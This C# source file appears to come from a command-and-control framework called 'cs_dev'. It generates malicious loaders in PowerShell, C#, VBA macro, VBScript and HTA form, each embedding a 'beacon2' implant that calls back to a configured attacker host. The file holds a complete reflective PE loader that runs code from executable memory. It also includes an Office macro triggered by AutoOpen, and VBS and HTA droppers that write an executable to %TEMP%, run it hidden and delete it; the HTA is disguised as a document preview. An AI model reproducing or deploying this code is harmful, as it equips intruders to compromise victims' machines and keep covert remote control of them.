using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace CsdevGui
{
    /// <summary>
    /// 脚本类载荷生成器 (客户端本地、零工具链)。
    ///
    /// 与 tools/gen_payload2.ps1 的脚本分支等价: 内嵌载体 = 原生模板(win2-dll 或 win2-exe),
    /// 先解密模板 + 覆写配置槽(含公钥), 再 base64 后包进脚本模板。全程不需要 gcc / PowerShell。
    ///
    /// 覆盖格式: win2-ps1 / win2-cs / win2-vba / win2-vbs / win2-hta。
    /// </summary>
    public static class ScriptGenerator
    {
        private static readonly string[] ScriptFormatIds =
        {
            "win2-ps1", "win2-cs", "win2-vba", "win2-vbs", "win2-hta"
        };

        public static bool Supports(string format)
        {
            if (string.IsNullOrEmpty(format)) return false;
            foreach (string id in ScriptFormatIds)
                if (string.Equals(id, format, StringComparison.OrdinalIgnoreCase)) return true;
            return false;
        }

        public static IReadOnlyList<string> Formats => ScriptFormatIds;

        public static string ExtOf(string format)
        {
            switch (format)
            {
                case "win2-ps1": return ".ps1";
                case "win2-cs": return ".cs";
                case "win2-vba": return ".bas";
                case "win2-vbs": return ".vbs";
                case "win2-hta": return ".hta";
                default: return ".txt";
            }
        }

        public sealed class Result
        {
            public byte[] Bytes;
            public string Log;
            public string FileName;
            public string Error;
            public bool Ok => Error == null;
        }

        /// <summary>生成一个脚本类载荷。</summary>
        public static Result Generate(string format, string host, int port, bool ssl,
                                      string uri, int sleep, int jitter, string password, byte[] pubkey)
        {
            try
            {
                if (!Supports(format))
                    return new Result { Error = "格式 " + format + " 不是脚本类格式" };

                // 载体: ps1/cs 走进程内反射加载 -> DLL; vba/vbs/hta 走落地执行 -> EXE
                string carrierFormat = (format == "win2-ps1" || format == "win2-cs") ? "win2-dll" : "win2-exe";
                byte[] carrier = NativeGenerator.BuildCarrier(carrierFormat, host, port, ssl, uri, sleep, jitter, "raw", password, pubkey);
                string b64 = Convert.ToBase64String(carrier);
                string uri2 = string.IsNullOrEmpty(uri) ? "/submit" : uri;
                string scheme = ssl ? "https" : "http";

                string text;
                bool utf8Bom; // true=UTF-8+BOM, false=GBK(系统 ANSI)

                switch (format)
                {
                    case "win2-ps1": text = BuildPs1(b64, host, port, uri2, scheme, carrier.Length); utf8Bom = true; break;
                    case "win2-cs":  text = BuildCs(b64, host, port, uri2, scheme, carrier.Length);  utf8Bom = true; break;
                    case "win2-vba": text = BuildVba(b64, host, port, uri2, scheme, carrier.Length); utf8Bom = false; break;
                    case "win2-vbs": text = BuildVbs(b64, host, port, uri2, scheme, carrier.Length); utf8Bom = false; break;
                    case "win2-hta": text = BuildHta(b64, host, port, uri2, scheme, carrier.Length); utf8Bom = false; break;
                    default: return new Result { Error = "未知脚本格式: " + format };
                }

                byte[] bytes = Encode(text, utf8Bom);
                var log = new StringBuilder();
                log.AppendLine("[*] 客户端脚本生成器 (零外部工具链, 未经过服务端)");
                log.AppendLine("    格式   : " + format);
                log.AppendLine("    回连   : " + scheme + "://" + host + ":" + port + uri2);
                log.AppendLine("    载体   : beacon2 " + (carrierFormat == "win2-dll" ? "DLL" : "EXE") + " " + carrier.Length + " 字节, base64 " + b64.Length + " 字符");
                log.AppendLine("    编码   : " + (utf8Bom ? "UTF-8 + BOM" : "GBK (系统 ANSI)"));
                log.AppendLine("[+] 生成完成");

                string fn = format + "_" + host + "_" + port + ExtOf(format);
                return new Result { Bytes = bytes, Log = log.ToString(), FileName = fn };
            }
            catch (Exception ex)
            {
                return new Result { Error = ex.Message };
            }
        }

        private static byte[] Encode(string text, bool utf8Bom)
        {
            if (utf8Bom) return new UTF8Encoding(true).GetBytes(text);
            try
            {
                Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
                return Encoding.GetEncoding(936).GetBytes(text);
            }
            catch
            {
                return Encoding.ASCII.GetBytes(text);
            }
        }

        private static string Split(string s, int width, string firstPrefix, string contPrefix, string lastSuffix)
        {
            var sb = new StringBuilder();
            for (int i = 0; i < s.Length; i += width)
            {
                int n = Math.Min(width, s.Length - i);
                string chunk = s.Substring(i, n);
                if (i == 0) sb.Append(firstPrefix + chunk);
                else sb.Append(contPrefix + chunk);
            }
            sb.Append(lastSuffix);
            return sb.ToString();
        }

        // ---------------------------------------------------------------- 反射加载器 (ps1/cs 共用)
        private const string LoaderCs = @"// cs_dev PE reflective loader (no third-party deps)
using System;
using System.Runtime.InteropServices;

public static class CsdevLoader
{
    [DllImport(""kernel32.dll"", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint allocType, uint protect);

    [DllImport(""kernel32.dll"", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadLibraryA(string name);

    [DllImport(""kernel32.dll"", CharSet = CharSet.Ansi, EntryPoint = ""GetProcAddress"", SetLastError = true)]
    private static extern IntPtr GetProcAddressByName(IntPtr mod, string name);

    [DllImport(""kernel32.dll"", EntryPoint = ""GetProcAddress"", SetLastError = true)]
    private static extern IntPtr GetProcAddressByOrd(IntPtr mod, IntPtr ordinal);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int DllEntryDelegate(IntPtr hinst, uint reason, IntPtr reserved);

    private const uint MEM_COMMIT_RESERVE = 0x3000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    private static int RvaToOff(byte[] pe, int lfanew, int optSize, int rva)
    {
        int sec = lfanew + 0x18 + optSize;
        int num = BitConverter.ToUInt16(pe, lfanew + 0x06);
        for (int i = 0; i < num; i++)
        {
            int va = BitConverter.ToInt32(pe, sec + 0x0C);
            int vs = BitConverter.ToInt32(pe, sec + 0x08);
            int rp = BitConverter.ToInt32(pe, sec + 0x14);
            if (rva >= va && rva < va + vs) return rp + (rva - va);
            sec += 0x28;
        }
        return rva;
    }

    private static string ReadAnsi(byte[] pe, int off)
    {
        int e = off;
        while (e < pe.Length && pe[e] != 0) e++;
        if (e <= off) return """";
        return System.Text.Encoding.ASCII.GetString(pe, off, e - off);
    }

    public static int Run(byte[] pe)
    {
        if (pe == null || pe.Length < 0x100) return -1;
        int lfanew = BitConverter.ToInt32(pe, 0x3C);
        if (lfanew < 0x40 || lfanew + 0xF0 > pe.Length) return -2;
        if (BitConverter.ToUInt32(pe, lfanew) != 0x00004550u) return -3;

        int optSize   = BitConverter.ToUInt16(pe, lfanew + 0x14);
        int numSec    = BitConverter.ToUInt16(pe, lfanew + 0x06);
        int entryRva  = BitConverter.ToInt32(pe, lfanew + 0x28);
        int imageSize = BitConverter.ToInt32(pe, lfanew + 0x50);
        int hdrSize   = BitConverter.ToInt32(pe, lfanew + 0x54);
        long prefBase = BitConverter.ToInt64(pe, lfanew + 0x30);
        int dir       = lfanew + 0x18 + 0x70;

        int impRva = BitConverter.ToInt32(pe, dir + 0x08);
        int relRva = BitConverter.ToInt32(pe, dir + 0x28);
        int relSz  = BitConverter.ToInt32(pe, dir + 0x2C);

        if (imageSize <= 0) return -4;
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)(uint)imageSize, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem == IntPtr.Zero) return -5;
        long img = (long)mem;
        long delta = img - prefBase;

        if (hdrSize > pe.Length) hdrSize = pe.Length;
        Marshal.Copy(pe, 0, mem, hdrSize);

        int secDesc = lfanew + 0x18 + optSize;
        for (int i = 0; i < numSec; i++)
        {
            int vs = BitConverter.ToInt32(pe, secDesc + 0x08);
            int va = BitConverter.ToInt32(pe, secDesc + 0x0C);
            int rs = BitConverter.ToInt32(pe, secDesc + 0x10);
            int rp = BitConverter.ToInt32(pe, secDesc + 0x14);
            int cp = vs > rs ? rs : vs;
            if (cp > 0 && rp > 0 && rp + cp <= pe.Length)
                Marshal.Copy(pe, rp, (IntPtr)(img + va), cp);
            secDesc += 0x28;
        }

        if (relRva != 0 && relSz != 0 && delta != 0)
        {
            int p = RvaToOff(pe, lfanew, optSize, relRva);
            int end = p + relSz;
            while (p + 8 <= end)
            {
                int blockRva = BitConverter.ToInt32(pe, p);
                int blockSz  = BitConverter.ToInt32(pe, p + 4);
                if (blockSz < 8) break;
                int cnt = (blockSz - 8) / 2;
                for (int k = 0; k < cnt; k++)
                {
                    int item = BitConverter.ToUInt16(pe, p + 8 + k * 2);
                    int type = item >> 12;
                    int ofs  = item & 0x0FFF;
                    IntPtr target = (IntPtr)(img + blockRva + ofs);
                    if (type == 10) Marshal.WriteInt64(target, Marshal.ReadInt64(target) + delta);
                    else if (type == 3) Marshal.WriteInt32(target, Marshal.ReadInt32(target) + (int)delta);
                }
                p += blockSz;
            }
        }

        if (impRva != 0)
        {
            int p = RvaToOff(pe, lfanew, optSize, impRva);
            while (p + 20 <= pe.Length)
            {
                int oft   = BitConverter.ToInt32(pe, p);
                int nameR = BitConverter.ToInt32(pe, p + 0x0C);
                int ft    = BitConverter.ToInt32(pe, p + 0x10);
                if (oft == 0 && nameR == 0 && ft == 0) break;
                if (nameR == 0) break;

                IntPtr mod = LoadLibraryA(ReadAnsi(pe, RvaToOff(pe, lfanew, optSize, nameR)));
                if (mod == IntPtr.Zero) return -6;

                int thunk = RvaToOff(pe, lfanew, optSize, oft != 0 ? oft : ft);
                int dest  = ft;
                while (thunk + 8 <= pe.Length)
                {
                    long t = BitConverter.ToInt64(pe, thunk);
                    if (t == 0) break;
                    IntPtr fn;
                    if (t < 0) fn = GetProcAddressByOrd(mod, (IntPtr)(t & 0xFFFF));
                    else fn = GetProcAddressByName(mod, ReadAnsi(pe, RvaToOff(pe, lfanew, optSize, (int)t) + 2));
                    if (fn == IntPtr.Zero) return -7;
                    Marshal.WriteInt64((IntPtr)(img + dest), (long)fn);
                    thunk += 8;
                    dest += 8;
                }
                p += 20;
            }
        }

        DllEntryDelegate entry = (DllEntryDelegate)Marshal.GetDelegateForFunctionPointer(
            (IntPtr)(img + entryRva), typeof(DllEntryDelegate));
        return entry((IntPtr)img, 1u, IntPtr.Zero) != 0 ? 0 : -8;
    }
}
";

        // ---------------------------------------------------------------- win2-ps1
        private static string BuildPs1(string b64, string host, int port, string uri, string scheme, int peLen)
        {
            return "# cs_dev PowerShell reflective loader (proto v2) -- callback " + scheme + "://" + host + ":" + port + uri + "\n" +
                "# embedded carrier = beacon2 DLL (" + peLen + " bytes), no disk write.\n" +
                "$ErrorActionPreference = 'Stop'\n" +
                "$LoaderCs = @'\n" + LoaderCs + "'@\n" +
                "if (-not ('CsdevLoader' -as [type])) {\n" +
                "    Add-Type -TypeDefinition $LoaderCs -Language CSharp | Out-Null\n" +
                "}\n" +
                "$b64 = @'\n" + b64 + "\n'@\n" +
                "$pe = [Convert]::FromBase64String(($b64 -replace '\\s',''))\n" +
                "$rc = [CsdevLoader]::Run($pe)\n" +
                "if ($rc -ne 0) { throw \"reflect load failed, stage $rc\" }\n" +
                "# implant thread is running; keep main thread alive\n" +
                "while ($true) { Start-Sleep -Seconds 60 }\n";
        }

        // ---------------------------------------------------------------- win2-cs
        private static string BuildCs(string b64, string host, int port, string uri, string scheme, int peLen)
        {
            string b64Block = Split(b64, 100, "            \"", " +`\r\n            \"", "\";\r\n");
            return "// cs_dev C# loader (proto v2) -- callback " + scheme + "://" + host + ":" + port + uri + "\n" +
                "// compile: csc /nologo /target:exe /out:loader.exe <this file>\n" +
                "// embedded carrier = beacon2 DLL (" + peLen + " bytes), no disk write.\n" +
                LoaderCs + "\n" +
                "public static class CsdevPayload\n" +
                "{\n" +
                "    private const string B64 =\n" + b64Block +
                "    public static string Value { get { return B64; } }\n" +
                "}\n\n" +
                "public static class CsdevProgram\n" +
                "{\n" +
                "    public static void Main()\n" +
                "    {\n" +
                "        byte[] pe = Convert.FromBase64String(CsdevPayload.Value);\n" +
                "        int rc = CsdevLoader.Run(pe);\n" +
                "        if (rc != 0) Environment.Exit(rc);\n" +
                "        System.Threading.Thread.Sleep(System.Threading.Timeout.Infinite);\n" +
                "    }\n" +
                "}\n";
        }

        // ---------------------------------------------------------------- win2-vba
        private static string BuildVba(string b64, string host, int port, string uri, string scheme, int peLen)
        {
            string constBlock = Split(b64, 760,
                "Private Const B64 As String = \"", "    \"", "\"\r\n");
            return "' cs_dev VBA macro (proto v2) -- callback " + scheme + "://" + host + ":" + port + uri + "\n" +
                "' usage: import into Word/Excel VBA editor (Alt+F11), triggered by AutoOpen.\n" +
                "' payload = beacon2 embedded bytes (" + peLen + " bytes), decoded to executable heap and run in a new thread.\n" +
                "Option Explicit\n\n" +
                "Private Declare PtrSafe Function HeapCreate Lib \"kernel32\" (ByVal flOptions As Long, ByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr\n" +
                "Private Declare PtrSafe Function HeapAlloc Lib \"kernel32\" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr\n" +
                "Private Declare PtrSafe Sub RtlMoveMemory Lib \"kernel32\" (ByVal dest As LongPtr, ByRef src As Byte, ByVal length As LongPtr)\n" +
                "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal lpAttr As LongPtr, ByVal dwStack As LongPtr, ByVal lpStart As LongPtr, ByVal lpParam As LongPtr, ByVal dwFlags As Long, ByRef lpThreadId As Long) As LongPtr\n" +
                "Private Declare PtrSafe Function WaitForSingleObject Lib \"kernel32\" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long\n\n" +
                "Private Const HEAP_CREATE_ENABLE_EXECUTE As Long = &H40000\n\n" +
                constBlock + "\n" +
                "Sub AutoOpen()\n" +
                "    RunPayload\n" +
                "End Sub\n\n" +
                "Private Function B64Decode(ByVal s As String) As Byte()\n" +
                "    Dim node As Object\n" +
                "    Set node = CreateObject(\"MSXML2.DOMDocument\").createElement(\"b\")\n" +
                "    node.DataType = \"bin.base64\"\n" +
                "    node.Text = s\n" +
                "    B64Decode = node.NodeTypedValue\n" +
                "End Function\n\n" +
                "Private Sub RunPayload()\n" +
                "    Dim buf() As Byte\n" +
                "    buf = B64Decode(B64)\n\n" +
                "    Dim hHeap As LongPtr, pMem As LongPtr, hThread As LongPtr\n" +
                "    Dim tid As Long\n\n" +
                "    hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)\n" +
                "    If hHeap = 0 Then Exit Sub\n" +
                "    pMem = HeapAlloc(hHeap, 0, UBound(buf) + 1)\n" +
                "    If pMem = 0 Then Exit Sub\n" +
                "    RtlMoveMemory pMem, buf(0), UBound(buf) + 1\n" +
                "    hThread = CreateThread(0, 0, pMem, 0, 0, tid)\n" +
                "    If hThread <> 0 Then WaitForSingleObject hThread, &HFFFFFFFF\n" +
                "End Sub\n";
        }

        // ---------------------------------------------------------------- win2-vbs
        private static string BuildVbs(string b64, string host, int port, string uri, string scheme, int peLen)
        {
            string constBlock = Split(b64, 200, "B64 = \"", "    \"", "\"\r\n");
            return "' cs_dev VBScript loader (proto v2) -- callback " + scheme + "://" + host + ":" + port + uri + "\n" +
                "' embedded beacon2 (" + peLen + " bytes): base64 -> drop %TEMP% -> hidden run -> self-delete\n" +
                "Option Explicit\n\n" +
                "Dim B64\n" +
                constBlock + "\n" +
                "Dim node, bytes, fso, sh, tmp, st\n" +
                "Set node = CreateObject(\"MSXML2.DOMDocument\").createElement(\"b\")\n" +
                "node.DataType = \"bin.base64\"\n" +
                "node.Text = B64\n" +
                "bytes = node.NodeTypedValue\n\n" +
                "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n" +
                "Set sh  = CreateObject(\"WScript.Shell\")\n" +
                "Randomize\n" +
                "tmp = sh.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\\" & Int(Rnd() * 899999 + 100000) & \".exe\"\n\n" +
                "Set st = CreateObject(\"ADODB.Stream\")\n" +
                "st.Type = 1\n" +
                "st.Open\n" +
                "st.Write bytes\n" +
                "st.SaveToFile tmp, 2\n" +
                "st.Close\n\n" +
                "sh.Run \"\"\"\" & tmp & \"\"\"\", 0, False\n" +
                "WScript.Sleep 1500\n" +
                "On Error Resume Next\n" +
                "fso.DeleteFile tmp, True\n";
        }

        // ---------------------------------------------------------------- win2-hta
        private static string BuildHta(string b64, string host, int port, string uri, string scheme, int peLen)
        {
            string constBlock = Split(b64, 200, "B64 = \"", "    \"", "\"\r\n");
            return "<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">\n" +
                "<title>Document Preview</title>\n" +
                "<HTA:APPLICATION ID=\"csdevHta\" SHOWINTASKBAR=\"no\" SINGLEINSTANCE=\"yes\" WINDOWSTATE=\"minimize\" SCROLL=\"no\"/>\n" +
                "<script language=\"VBScript\">\n" +
                "' cs_dev HTA loader (proto v2) -- callback " + scheme + "://" + host + ":" + port + uri + "\n" +
                "Option Explicit\n\n" +
                "Dim B64\n" +
                constBlock + "\n" +
                "Sub Window_OnLoad\n" +
                "    On Error Resume Next\n" +
                "    Dim node, bytes, sh, fso, tmp\n" +
                "    Set node = CreateObject(\"MSXML2.DOMDocument\").createElement(\"b\")\n" +
                "    node.DataType = \"bin.base64\"\n" +
                "    node.Text = B64\n" +
                "    bytes = node.NodeTypedValue\n\n" +
                "    Set fso = CreateObject(\"Scripting.FileSystemObject\")\n" +
                "    Set sh  = CreateObject(\"WScript.Shell\")\n" +
                "    tmp = sh.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\\" & Int(Rnd() * 899999 + 100000) & \".exe\"\n\n" +
                "    Dim st\n" +
                "    Set st = CreateObject(\"ADODB.Stream\")\n" +
                "    st.Type = 1\n" +
                "    st.Open\n" +
                "    st.Write bytes\n" +
                "    st.SaveToFile tmp, 2\n" +
                "    st.Close\n\n" +
                "    sh.Run \"\"\"\" & tmp & \"\"\"\", 0, False\n" +
                "    window.close\n" +
                "End Sub\n" +
                "</script>\n</head>\n<body>\n<p>preparing document ...</p>\n</body>\n</html>\n";
        }
    }
}
